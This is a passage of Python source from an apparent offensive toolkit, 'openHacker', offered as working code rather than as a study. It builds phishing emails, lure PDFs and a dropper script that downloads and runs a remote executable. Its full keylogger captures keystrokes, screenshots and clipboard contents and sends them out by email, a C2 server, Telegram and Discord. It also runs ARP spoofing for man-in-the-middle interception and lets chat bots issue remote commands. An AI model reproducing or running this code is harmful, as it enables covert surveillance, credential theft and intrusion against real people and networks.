                    rev_name = dns.reversename.from_address(ip)
                    answers = dns.resolver.resolve(rev_name, "PTR")
                    if answers:
                        domain = str(answers[0]).rstrip('.')
                        return domain
            except:
                pass
            
            try:
                domain = socket.gethostbyaddr(ip)[0]
                if domain:
                    return domain
            except:
                pass
            
            return None
        except Exception as e:
            logger.error(f"IP to domain translation error: {e}")
            return None
    
    def translate_domain_to_ip(self, domain: str) -> Optional[str]:
        try:
            ip = self.db.resolve_domain(domain)
            if ip:
                return ip
            
            try:
                if DNS_AVAILABLE:
                    import dns.resolver
                    answers = dns.resolver.resolve(domain, "A")
                    if answers:
                        ip = str(answers[0])
                        return ip
            except:
                pass
            
            try:
                ip = socket.gethostbyname(domain)
                if ip:
                    return ip
            except:
                pass
            
            return None
        except Exception as e:
            logger.error(f"Domain to IP translation error: {e}")
            return None
    
    def host_domain(self, ip: str, domain: str, port: int = 8080) -> DomainHost:
        try:
            ipaddress.ip_address(ip)
            
            host_id = str(uuid.uuid4())[:8]
            hosting_path = os.path.join(DOMAIN_HOSTING_DIR, host_id)
            os.makedirs(hosting_path, exist_ok=True)
            
            domain_host = DomainHost(
                id=host_id,
                ip=ip,
                domain=domain,
                hosting_path=hosting_path,
                created_at=datetime.datetime.now().isoformat(),
                active=True
            )
            
            self.db.add_domain_host(domain_host)
            
            self.hosted_domains[domain] = {
                'ip': ip,
                'port': port,
                'path': hosting_path,
                'id': host_id
            }
            self.domain_to_ip[domain] = ip
            
            logger.info(f"Domain {domain} hosted on IP {ip}:{port}")
            return domain_host
        except Exception as e:
            logger.error(f"Domain hosting error: {e}")
            return None
    
    def host_website(self, domain: str, html_content: str) -> bool:
        try:
            if domain not in self.hosted_domains:
                return False
            
            domain_info = self.hosted_domains[domain]
            index_path = os.path.join(domain_info['path'], 'index.html')
            
            with open(index_path, 'w') as f:
                f.write(html_content)
            
            port = domain_info['port']
            threading.Thread(target=self._start_http_server, args=(domain_info['path'], port), daemon=True).start()
            
            logger.info(f"Website hosted on http://{domain}:{port}")
            return True
        except Exception as e:
            logger.error(f"Website hosting error: {e}")
            return False
    
    def _start_http_server(self, path: str, port: int):
        try:
            os.chdir(path)
            handler = http.server.SimpleHTTPRequestHandler
            with socketserver.TCPServer(("0.0.0.0", port), handler) as httpd:
                logger.info(f"Serving domain on port {port}")
                httpd.serve_forever()
        except Exception as e:
            logger.error(f"HTTP server error: {e}")
    
    def list_hosted_domains(self) -> List[Dict]:
        try:
            return self.db.get_domain_hosts()
        except Exception as e:
            logger.error(f"List domains error: {e}")
            return []
    
    def get_domain_ips(self) -> Dict[str, str]:
        try:
            rows = self.db.get_domain_hosts()
            return {row['domain']: row['ip'] for row in rows if row['active']}
        except Exception as e:
            logger.error(f"Get domain IPs error: {e}")
            return {}

# =====================
# DEPLOYMENT ENGINE
# =====================
class DeploymentEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
    
    def create_pdf_payload(self, name: str, target: str, keylog_url: str) -> Deployment:
        deployment_id = str(uuid.uuid4())[:8]
        
        pdf_content = f"""
        %PDF-1.4
        1 0 obj
        << /Type /Catalog /Pages 2 0 R >>
        endobj
        2 0 obj
        << /Type /Pages /Kids [3 0 R] /Count 1 >>
        endobj
        3 0 obj
        << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>
        endobj
        4 0 obj
        << /Length 200 >>
        stream
        BT
        /F1 24 Tf
        100 700 Td
        (Important Document) Tj
        /F1 12 Tf
        100 650 Td
        (Please click here to view: {keylog_url}) Tj
        ET
        endstream
        endobj
        xref
        0 5
        0000000000 65535 f
        0000000009 00000 n
        0000000054 00000 n
        0000000102 00000 n
        0000000200 00000 n
        trailer
        << /Size 5 /Root 1 0 R >>
        startxref
        300
        %%EOF
        """
        
        pdf_path = os.path.join(DEPLOYMENT_DIR, f"{deployment_id}.pdf")
        with open(pdf_path, 'w') as f:
            f.write(pdf_content)
        
        deployment = Deployment(
            id=deployment_id,
            name=name,
            type="pdf",
            payload=pdf_path,
            target=target,
            created_at=datetime.datetime.now().isoformat()
        )
        
        self.db.save_deployment(deployment)
        return deployment
    
    def create_email_payload(self, name: str, target: str, subject: str, body: str, keylog_url: str) -> Deployment:
        deployment_id = str(uuid.uuid4())[:8]
        
        email_content = f"""
        Subject: {subject}
        From: security@{self.config.get('spear_phishing.smtp_username', '').split('@')[-1] or 'example.com'}
        To: {target}
        Content-Type: text/html
        
        <html>
        <body>
        {body}
        <br><br>
        <a href="{keylog_url}">Click here to view the document</a>
        <br><br>
        <img src="{keylog_url}/tracking.gif" width="1" height="1">
        </body>
        </html>
        """
        
        email_path = os.path.join(DEPLOYMENT_DIR, f"{deployment_id}.eml")
        with open(email_path, 'w') as f:
            f.write(email_content)
        
        deployment = Deployment(
            id=deployment_id,
            name=name,
            type="email",
            payload=email_path,
            target=target,
            created_at=datetime.datetime.now().isoformat()
        )
        
        self.db.save_deployment(deployment)
        return deployment
    
    def create_link_payload(self, name: str, target: str, keylog_url: str) -> Deployment:
        deployment_id = str(uuid.uuid4())[:8]
        
        if SHORTENER_AVAILABLE:
            try:
                s = pyshorteners.Shortener()
                keylog_url = s.tinyurl.short(keylog_url)
            except:
                pass
        
        deployment = Deployment(
            id=deployment_id,
            name=name,
            type="link",
            payload=keylog_url,
            target=target,
            created_at=datetime.datetime.now().isoformat()
        )
        
        self.db.save_deployment(deployment)
        return deployment
    
    def create_executable_payload(self, name: str, target: str, keylog_server: str) -> Deployment:
        deployment_id = str(uuid.uuid4())[:8]
        
        exe_content = f'''
import os
import sys
import subprocess
import requests
import platform
import base64

def download_and_execute(url):
    try:
        response = requests.get(url, timeout=30)
        if response.status_code == 200:
            temp_path = os.path.join(os.environ.get('TEMP', '/tmp'), 'update.exe')
            with open(temp_path, 'wb') as f:
                f.write(response.content)
            os.chmod(temp_path, 0o755)
            subprocess.Popen([temp_path], shell=True)
    except:
        pass

if __name__ == "__main__":
    download_and_execute("{keylog_server}/download")
'''
        
        exe_path = os.path.join(DEPLOYMENT_DIR, f"{deployment_id}.py")
        with open(exe_path, 'w') as f:
            f.write(exe_content)
        
        deployment = Deployment(
            id=deployment_id,
            name=name,
            type="executable",
            payload=exe_path,
            target=target,
            created_at=datetime.datetime.now().isoformat()
        )
        
        self.db.save_deployment(deployment)
        return deployment
    
    def get_deployments(self) -> List[Dict]:
        return self.db.get_deployments()
    
    def track_opened(self, deployment_id: str):
        self.db.update_deployment_status(deployment_id, opened=True)
        logger.info(f"Deployment {deployment_id} opened")
    
    def track_executed(self, deployment_id: str):
        self.db.update_deployment_status(deployment_id, executed=True)
        logger.info(f"Deployment {deployment_id} executed")

# =====================
# KEYLOGGER ENGINE
# =====================
class KeyloggerEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running = False
        self.listener = None
        self.text = ""
        self.current_window = ""
        self.current_process = ""
        self.log_file = config.get('keylogger.log_file', KEYLOG_FILE)
        self.c2_server = config.get('keylogger.c2_server', "")
        self.upload_interval = config.get('keylogger.upload_interval', 30)
        self.screenshot_interval = config.get('keylogger.screenshot_interval', 60)
        self.capture_clipboard = config.get('keylogger.capture_clipboard', True)
        self.upload_timer = None
        self.screenshot_timer = None
        self.clipboard_timer = None
        self.last_clipboard = ""
        self.exfil_methods = config.get('keylogger.exfil_methods', ["file", "email", "c2"])
        self.telegram_bot = None
        self.discord_bot = None
    
    def start(self):
        if not PYNPUT_AVAILABLE:
            print(f"{Colors.ERROR}❌ Pynput not available. Install with: pip install pynput{Colors.RESET}")
            return False
        
        if self.running:
            return True
        
        try:
            self.running = True
            self.text = ""
            
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            
            self.upload_timer = threading.Timer(self.upload_interval, self._upload_keylog)
            self.upload_timer.daemon = True
            self.upload_timer.start()
            
            if self.screenshot_interval > 0:
                self.screenshot_timer = threading.Timer(self.screenshot_interval, self._take_screenshot)
                self.screenshot_timer.daemon = True
                self.screenshot_timer.start()
            
            if self.capture_clipboard:
                self.clipboard_timer = threading.Timer(5, self._monitor_clipboard)
                self.clipboard_timer.daemon = True
                self.clipboard_timer.start()
            
            print(f"{Colors.SUCCESS}✅ Advanced Keylogger started{Colors.RESET}")
            print(f"{Colors.WHITE}  • Press {self.config.get('keylogger.hotkey', 'F10')} to stop{Colors.RESET}")
            print(f"{Colors.WHITE}  • Screenshot interval: {self.screenshot_interval}s{Colors.RESET}")
            print(f"{Colors.WHITE}  • Upload interval: {self.upload_interval}s{Colors.RESET}")
            print(f"{Colors.WHITE}  • Clipboard capture: {'Enabled' if self.capture_clipboard else 'Disabled'}{Colors.RESET}")
            return True
        except Exception as e:
            print(f"{Colors.ERROR}❌ Failed to start keylogger: {e}{Colors.RESET}")
            return False
    
    def stop(self):
        self.running = False
        
        if self.listener:
            self.listener.stop()
            self.listener = None
        
        for timer in [self.upload_timer, self.screenshot_timer, self.clipboard_timer]:
            if timer:
                try:
                    timer.cancel()
                except:
                    pass
        
        self._save_keylog()
        print(f"{Colors.SUCCESS}✅ Keylogger stopped{Colors.RESET}")
    
    def on_press(self, key):
        try:
            if key == keyboard.Key.f10:
                self.stop()
                return False
            
            if key == keyboard.Key.enter:
                self.text += "\n"
            elif key == keyboard.Key.tab:
                self.text += "\t"
            elif key == keyboard.Key.space:
                self.text += " "
            elif key == keyboard.Key.backspace and len(self.text) > 0:
                self.text = self.text[:-1]
            elif hasattr(key, 'char') and key.char is not None:
                self._update_window_info()
                self.text += key.char
            
            if len(self.text) > 10000:
                self._save_keylog()
                self.text = ""
                
        except Exception as e:
            logger.error(f"Keylogger error: {e}")
    
    def _update_window_info(self):
        try:
            import pygetwindow as gw
            active = gw.getActiveWindow()
            if active:
                self.current_window = active.title
                self.current_process = active.title[:100]
        except:
            pass
    
    def _save_keylog(self):
        if self.text:
            timestamp = datetime.datetime.now().isoformat()
            screenshot_path = ""
            
            if self.screenshot_interval > 0:
                screenshot_path = self._take_screenshot()
            
            self.db.save_keylog(self.text, self.current_window, self.current_process, screenshot_path)
            
            with open(self.log_file, 'a') as f:
                f.write(f"\n[{timestamp}] [{self.current_window}]\n{self.text}\n")
            
            self._exfiltrate_data(self.text, screenshot_path)
            
            logger.info(f"Saved {len(self.text)} keylog characters")
    
    def _take_screenshot(self) -> str:
        try:
            import pyautogui
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            screenshot_path = os.path.join(KEYLOG_EXFIL_DIR, f"screenshot_{timestamp}.png")
            screenshot = pyautogui.screenshot()
            screenshot.save(screenshot_path)
            logger.info(f"Screenshot saved: {screenshot_path}")
            return screenshot_path
        except:
            return ""
    
    def _monitor_clipboard(self):
        if not self.running:
            return
        
        try:
            import pyperclip
            current = pyperclip.paste()
            if current and current != self.last_clipboard:
                self.last_clipboard = current
                self.db.save_clipboard(current, "keylogger")
                logger.info(f"Clipboard captured: {current[:100]}...")
                self._exfiltrate_clipboard(current)
        except:
            pass
        
        if self.running:
            self.clipboard_timer = threading.Timer(5, self._monitor_clipboard)
            self.clipboard_timer.daemon = True
            self.clipboard_timer.start()
    
    def _exfiltrate_data(self, text: str, screenshot_path: str = ""):
        for method in self.exfil_methods:
            try:
                if method == "file":
                    self._exfil_file(text, screenshot_path)
                elif method == "email":
                    self._exfil_email(text, screenshot_path)
                elif method == "c2":
                    self._exfil_c2(text, screenshot_path)
                elif method == "telegram":
                    self._exfil_telegram(text, screenshot_path)
                elif method == "discord":
                    self._exfil_discord(text, screenshot_path)
            except Exception as e:
                logger.error(f"Exfil via {method} failed: {e}")
    
    def _exfil_file(self, text: str, screenshot_path: str):
        try:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = os.path.join(KEYLOG_EXFIL_DIR, f"exfil_{timestamp}.txt")
            with open(filename, 'w') as f:
                f.write(f"[{timestamp}]\n{text}\n")
                if screenshot_path:
                    f.write(f"\nScreenshot: {screenshot_path}\n")
            logger.info(f"Exfil saved to file: {filename}")
        except:
            pass
    
    def _exfil_email(self, text: str, screenshot_path: str):
        try:
            smtp_server = self.config.get('spear_phishing.smtp_server', '')
            smtp_port = self.config.get('spear_phishing.smtp_port', 587)
            smtp_username = self.config.get('spear_phishing.smtp_username', '')
            smtp_password = self.config.get('spear_phishing.smtp_password', '')
            to_email = self.config.get('keylogger.email_recipient', '')
            
            if not all([smtp_server, smtp_username, smtp_password, to_email]):
                return
            
            msg = email.message.EmailMessage()
            msg['Subject'] = f"Keylog Data - {datetime.datetime.now().isoformat()}"
            msg['From'] = smtp_username
            msg['To'] = to_email
            msg.set_content(f"Keylog Data:\n\n{text}")
            
            if screenshot_path and os.path.exists(screenshot_path):
                with open(screenshot_path, 'rb') as f:
                    msg.add_attachment(f.read(), maintype='image', subtype='png', filename=os.path.basename(screenshot_path))
            
            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.starttls()
                server.login(smtp_username, smtp_password)
                server.send_message(msg)
            
            logger.info("Keylog exfiltrated via email")
        except:
            pass
    
    def _exfil_c2(self, text: str, screenshot_path: str):
        if not self.c2_server:
            return
        try:
            data = {
                'timestamp': datetime.datetime.now().isoformat(),
                'text': text,
                'hostname': socket.gethostname(),
                'window': self.current_window
            }
            if screenshot_path:
                data['screenshot'] = base64.b64encode(open(screenshot_path, 'rb').read()).decode()
            
            requests.post(self.c2_server, json=data, timeout=10)
            logger.info("Keylog exfiltrated via C2")
        except:
            pass
    
    def _exfil_telegram(self, text: str, screenshot_path: str):
        try:
            if self.telegram_bot:
                self.telegram_bot.send_message(f"🐙 Keylog Data:\n\n{text[:3000]}")
                if screenshot_path:
                    self.telegram_bot.send_photo(screenshot_path)
        except:
            pass
    
    def _exfil_discord(self, text: str, screenshot_path: str):
        try:
            if self.discord_bot:
                self.discord_bot.send_message(f"🐙 Keylog Data:\n```\n{text[:1900]}\n```")
                if screenshot_path:
                    self.discord_bot.send_file(screenshot_path)
        except:
            pass
    
    def _exfiltrate_clipboard(self, text: str):
        for method in self.exfil_methods:
            try:
                if method == "file":
                    self._exfil_file(f"CLIPBOARD: {text}", "")
                elif method == "email":
                    self._exfil_email(f"CLIPBOARD: {text}", "")
                elif method == "c2":
                    self._exfil_c2(f"CLIPBOARD: {text}", "")
            except:
                pass
    
    def _upload_keylog(self):
        if self.text:
            self._save_keylog()
            self.text = ""
        
        if self.running:
            self.upload_timer = threading.Timer(self.upload_interval, self._upload_keylog)
            self.upload_timer.daemon = True
            self.upload_timer.start()
    
    def get_keylogs(self, limit: int = 100):
        return self.db.get_keylogs(limit)
    
    def get_screenshots(self) -> List[str]:
        try:
            return [f for f in os.listdir(KEYLOG_EXFIL_DIR) if f.startswith('screenshot_')]
        except:
            return []
    
    def set_telegram_bot(self, bot):
        self.telegram_bot = bot
    
    def set_discord_bot(self, bot):
        self.discord_bot = bot

# =====================
# ARP SPOOFING ENGINE
# =====================
class ARPSpoofingEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running = False
        self.active_spoofs = {}
        self.interface = config.get('arp_spoofing.interface', 'eth0')
        self.enable_ip_forward = config.get('arp_spoofing.enable_ip_forward', True)
        self.sniff_interval = config.get('arp_spoofing.sniff_interval', 60)
        self.stop_events = {}
    
    def start_spoof(self, target_ip: str, gateway_ip: str, interface: str = None) -> ARPSpoofResult:
        if not SCAPY_AVAILABLE:
            return ARPSpoofResult(
                target_ip=target_ip,
                gateway_ip=gateway_ip,
                interface=interface or self.interface,
                status="failed",
                packets_sent=0,
                duration=0.0,
                started_at=datetime.datetime.now().isoformat(),
                ended_at=datetime.datetime.now().isoformat()
            )
        
        try:
            ipaddress.ip_address(target_ip)
            ipaddress.ip_address(gateway_ip)
        except ValueError:
            return ARPSpoofResult(
                target_ip=target_ip,
                gateway_ip=gateway_ip,
                interface=interface or self.interface,
                status="failed",
                packets_sent=0,
                duration=0.0,
                started_at=datetime.datetime.now().isoformat(),
                ended_at=datetime.datetime.now().isoformat()
            )
        
        if self.enable_ip_forward:
            self._enable_ip_forward()
        
        self.db.add_arp_spoof(target_ip, gateway_ip, interface or self.interface)
        
        spoof_id = f"{target_ip}_{gateway_ip}_{int(time.time())}"
        stop_event = threading.Event()
        self.stop_events[spoof_id] = stop_event
        
        thread = threading.Thread(
            target=self._run_spoof,
            args=(spoof_id, target_ip, gateway_ip, interface or self.interface, stop_event),
            daemon=True
        )
        thread.start()
        
        self.active_spoofs[spoof_id] = {
            'target_ip': target_ip,
            'gateway_ip': gateway_ip,
            'interface': interface or self.interface,
            'start_time': datetime.datetime.now().isoformat(),
            'status': 'running'
        }
        
        return ARPSpoofResult(
            target_ip=target_ip,
            gateway_ip=gateway_ip,
            interface=interface or self.interface,
            status="running",
            packets_sent=0,
            duration=0.0,
            started_at=datetime.datetime.now().isoformat(),
            ended_at=""
        )
    
    def _run_spoof(self, spoof_id: str, target_ip: str, gateway_ip: str,
                   interface: str, stop_event: threading.Event):
        try:
            from scapy.all import ARP, Ether, send, srp
            
            target_mac = self._get_mac(target_ip, interface)
            gateway_mac = self._get_mac(gateway_ip, interface)
            
            if not target_mac or not gateway_mac:
                self._update_spoof_status(spoof_id, "failed", 0, 0)
                return
            
            packets_sent = 0
            start_time = time.time()
            
            while not stop_event.is_set():
                packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
                send(packet1, verbose=False)
                
                packet2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
                send(packet2, verbose=False)
                
                packets_sent += 2
                time.sleep(1)
            
            duration = time.time() - start_time
            self._update_spoof_status(spoof_id, "completed", packets_sent, duration)
            
        except Exception as e:
            logger.error(f"ARP spoofing error: {e}")
            self._update_spoof_status(spoof_id, "failed", 0, 0)
    
    def _get_mac(self, ip: str, interface: str) -> Optional[str]:
        try:
            from scapy.all import ARP, Ether, srp
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered, _ = srp(arp_request_broadcast, timeout=2, iface=interface, verbose=False)
            if answered:
                return answered[0][1].hwsrc
            return None
        except:
            return None
    
    def _update_spoof_status(self, spoof_id: str, status: str, packets_sent: int, duration: float):
        if spoof_id in self.active_spoofs:
            spoof = self.active_spoofs[spoof_id]
            self.db.update_arp_spoof(
                spoof['target_ip'],
                spoof['gateway_ip'],
                packets_sent,
                duration,
                datetime.datetime.now().isoformat()
            )
            spoof['status'] = status
            if status == 'completed' or status == 'failed':
                if spoof_id in self.stop_events:
                    del self.stop_events[spoof_id]
                del self.active_spoofs[spoof_id]
    
    def _enable_ip_forward(self):
        try:
            if platform.system().lower() == 'linux':
                with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                    f.write('1')
            elif platform.system().lower() == 'windows':
                subprocess.run(
                    ['reg', 'add', 'HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters',
                     '/v', 'IPEnableRouter', '/t', 'REG_DWORD', '/d', '1', '/f'],
                    capture_output=True
                )
        except Exception as e:
            logger.error(f"Failed to enable IP forwarding: {e}")
    
    def stop_spoof(self, spoof_id: str = None) -> bool:
        if spoof_id:
            if spoof_id in self.stop_events:
                self.stop_events[spoof_id].set()
                return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True
        return False
    
    def get_active_spoofs(self) -> List[Dict]:
        return [
            {
                'id': sid,
                'target_ip': spoof['target_ip'],
                'gateway_ip': spoof['gateway_ip'],
                'interface': spoof['interface'],
                'status': spoof['status'],
                'start_time': spoof['start_time']
            }
            for sid, spoof in self.active_spoofs.items()
        ]
    
    def get_spoof_history(self, limit: int = 20) -> List[Dict]:
        return self.db.get_arp_spoofs()

# =====================
# MAC ADDRESS MANAGER
# =====================
class MACManager:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.vendor_cache = {}
        self._load_vendor_cache()
    
    def _load_vendor_cache(self):
        try:
            vendor_file = os.path.join(CONFIG_DIR, "mac_vendors.json")
            if os.path.exists(vendor_file):
                with open(vendor_file, 'r') as f:
                    self.vendor_cache = json.load(f)
        except:
            pass
    
    def get_mac_info(self, mac_address: str) -> Dict:
        mac = mac_address.upper()
        mac = mac.replace('-', ':')
        mac = mac.replace('.', ':')
        
        db_info = self.db.get_mac_info(mac)
        if db_info:
            return db_info
        
        vendor = self._get_vendor(mac)
        ip = self._get_ip_from_mac(mac)
        hostname = None
        if ip:
            try:
                hostname = socket.gethostbyaddr(ip)[0]
            except:
                pass
        
        self.db.add_mac_info(mac, vendor, ip, hostname)
        
        return {
            'mac_address': mac,
            'vendor': vendor or 'Unknown',
            'ip_address': ip or 'Unknown',
            'hostname': hostname or 'Unknown',
            'first_seen': datetime.datetime.now().isoformat(),
            'last_seen': datetime.datetime.now().isoformat()
        }
    
    def _get_vendor(self, mac: str) -> Optional[str]:
        prefix = mac[:8].upper().replace(':', '')
        
        if prefix in self.vendor_cache:
            return self.vendor_cache[prefix]
        
        try:
            response = requests.get(
                f"https://api.macvendors.com/{mac}",
                timeout=5
            )
            if response.status_code == 200:
                vendor = response.text.strip()
                self.vendor_cache[prefix] = vendor
                return vendor
        except:
            pass
        
        return None
    
    def _get_ip_from_mac(self, mac: str) -> Optional[str]:
        try:
            if platform.system().lower() == 'linux':
                result = subprocess.run(
                    ['arp', '-n'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                for line in result.stdout.split('\n'):
                    if mac.lower() in line.lower():
                        parts = line.split()
                        if len(parts) >= 1:
                            return parts[0]
            elif platform.system().lower() == 'windows':
                result = subprocess.run(
                    ['arp', '-a'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                for line in result.stdout.split('\n'):
                    if mac in line:
                        parts = line.split()
                        if len(parts) >= 1:
                            return parts[0]
        except:
            pass
        return None
    
    def scan_network(self, network: str = None) -> List[Dict]:
        if not SCAPY_AVAILABLE:
            return []
        
        if not network:
            local_ip = self._get_local_ip()
            network = f"{local_ip}/24"
        
        results = []
        try:
            from scapy.all import ARP, Ether, srp
            
            arp = ARP(pdst=network)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether / arp
            
            answered, _ = srp(packet, timeout=2, verbose=False)
            
            for sent, received in answered:
                mac = received.hwsrc
                ip = received.psrc
                vendor = self._get_vendor(mac)
                self.db.add_mac_info(mac, vendor, ip, None)
                
                results.append({
                    'mac_address': mac,
                    'ip_address': ip,
                    'vendor': vendor or 'Unknown'
                })
        except Exception as e:
            logger.error(f"Network scan error: {e}")
        
        return results
    
    def _get_local_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "192.168.1.1"

# =====================
# NAT INFORMATION ENGINE
# =====================
class NATInfoEngine:
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def get_nat_info(self) -> NATInfo:
        public_ip = self._get_public_ip()
        private_ip = self._get_private_ip()
        router_ip = self._get_router_ip()
        location = self._get_location(public_ip) if public_ip else {}
        
        nat_info = NATInfo(
            public_ip=public_ip or 'Unknown',
            private_ip=private_ip or 'Unknown',
            router_ip=router_ip or 'Unknown',
            country=location.get('country', 'Unknown'),
            isp=location.get('isp', 'Unknown'),
            nat_type=self._detect_nat_type()
        )
        
        self.db.add_nat_info(
            nat_info.public_ip,
            nat_info.private_ip,
            nat_info.router_ip,
            nat_info.country,
            nat_info.isp,
            nat_info.nat_type
        )
        
        return nat_info
    
    def _get_public_ip(self) -> Optional[str]:
        try:
            response = requests.get('https://api.ipify.org', timeout=5)
            if response.status_code == 200:
                return response.text.strip()
        except:
            pass
        
        try:
            response = requests.get('http://icanhazip.com', timeout=5)
            if response.status_code == 200:
                return response.text.strip()
        except:
            pass
        
        return None
    
    def _get_private_ip(self) -> Optional[str]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return None
    
    def _get_router_ip(self) -> Optional[str]:
        try:
            if platform.system().lower() == 'linux':
                result = subprocess.run(
                    ['ip', 'route', 'show', 'default'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                for line in result.stdout.split('\n'):
                    if 'default' in line:
                        parts = line.split()
                        if len(parts) >= 3:
                            return parts[2]
            elif platform.system().lower() == 'windows':
                result = subprocess.run(
                    ['ipconfig'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                for line in result.stdout.split('\n'):
                    if 'Default Gateway' in line:
                        parts = line.split(':')
                        if len(parts) >= 2:
                            return parts[1].strip()
        except:
            pass
        return None
    
    def _get_location(self, ip: str) -> Dict:
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'country': data.get('country', 'Unknown'),
                        'city': data.get('city', 'Unknown'),
                        'isp': data.get('isp', 'Unknown'),
                        'lat': data.get('lat', 0),
                        'lon': data.get('lon', 0)
                    }
        except:
            pass
        return {}
    
    def _detect_nat_type(self) -> str:
        public_ip = self._get_public_ip()
        private_ip = self._get_private_ip()
        
        if public_ip and private_ip and public_ip != private_ip:
            return 'Full Cone NAT'
        elif public_ip and private_ip and public_ip == private_ip:
            return 'No NAT (Public IP)'
        else:
            return 'Unknown NAT Type'

# =====================
# PLATFORM BOTS
# =====================
class DiscordBot:
    def __init__(self, handler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.bot = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "discord_config.json")):
                with open(os.path.join(CONFIG_DIR, "discord_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'token': '', 'prefix': '!'}
    
    def save_config(self, token: str, enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'token': token, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "discord_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not DISCORD_AVAILABLE:
            return False
        if not self.config.get('token'):
            return False
        
        intents = discord.Intents.default()
        intents.message_content = True
        self.bot = commands.Bot(command_prefix=self.config.get('prefix', '!'), intents=intents)
        
        @self.bot.event
        async def on_ready():
            print(f"{Colors.SUCCESS}✅ Discord bot connected as {self.bot.user}{Colors.RESET}")
            self.running = True
        
        @self.bot.event
        async def on_message(message):
            if message.author.bot:
                return
            if message.content.startswith(self.config.get('prefix', '!')):
                cmd = message.content[len(self.config.get('prefix', '!')):].strip()
                result = self.handler.execute(cmd, 'discord', str(message.author.id))
                output = result.get('output', '')[:1900]
                embed = discord.Embed(title="🐙 openHacker Response", description=f"```{output}```",
                                     color=0xFFFFFF)
                embed.set_footer(text=f"Time: {result.get('execution_time', 0):.2f}s")
                await message.channel.send(embed=embed)
            await self.bot.process_commands(message)
        return True
    
    def start(self):
        if self.bot:
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            asyncio.run(self.bot.start(self.config['token']))
        except Exception as e:
            logger.error(f"Discord bot error: {e}")
    
    def send_message(self, text: str):
        try:
            if self.bot and self.running:
                channel = self.bot.get_channel(int(self.config.get('channel_id', 0)))
                if channel:
                    asyncio.run_coroutine_threadsafe(channel.send(text), self.bot.loop)
        except:
            pass
    
    def send_file(self, file_path: str):
        try:
            if self.bot and self.running and os.path.exists(file_path):
                channel = self.bot.get_channel(int(self.config.get('channel_id', 0)))
                if channel:
                    asyncio.run_coroutine_threadsafe(channel.send(file=discord.File(file_path)), self.bot.loop)
        except:
            pass


class TelegramBot:
    def __init__(self, handler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.client = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "telegram_config.json")):
                with open(os.path.join(CONFIG_DIR, "telegram_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'bot_token': '', 'chat_id': '', 'prefix': '/'}
    
    def save_config(self, bot_token: str, chat_id: str = "", enabled: bool = True, prefix: str = '/') -> bool:
        try:
            config = {'enabled': enabled, 'bot_token': bot_token, 'chat_id': chat_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "telegram_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not TELETHON_AVAILABLE:
            return False
        if not self.config.get('bot_token'):
            return False
        return True
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            async def main():
                self.client = TelegramClient('openhacker_session', 1, 'dummy')
                await self.client.start(bot_token=self.config['bot_token'])
                print(f"{Colors.SUCCESS}✅ Telegram bot connected{Colors.RESET}")
                self.running = True
                
                @self.client.on(events.NewMessage)
                async def handler(event):
                    if event.message.text and event.message.text.startswith(self.config.get('prefix', '/')):
                        cmd = event.message.text[1:].strip()
                        result = self.handler.execute(cmd, 'telegram', str(event.sender_id))
                        output = result.get('output', '')[:4000]
                        await event.reply(f"```{output}```\n_Time: {result.get('execution_time', 0):.2f}s_")
                
                await self.client.run_until_disconnected()
            
            asyncio.run(main())
        except Exception as e:
            logger.error(f"Telegram bot error: {e}")
    
    def send_message(self, text: str):
        try:
            if self.client and self.running:
                asyncio.run_coroutine_threadsafe(
                    self.client.send_message(self.config['chat_id'], text[:4000]),
                    self.client.loop
                )
        except:
            pass
    
    def send_photo(self, photo_path: str):
        try:
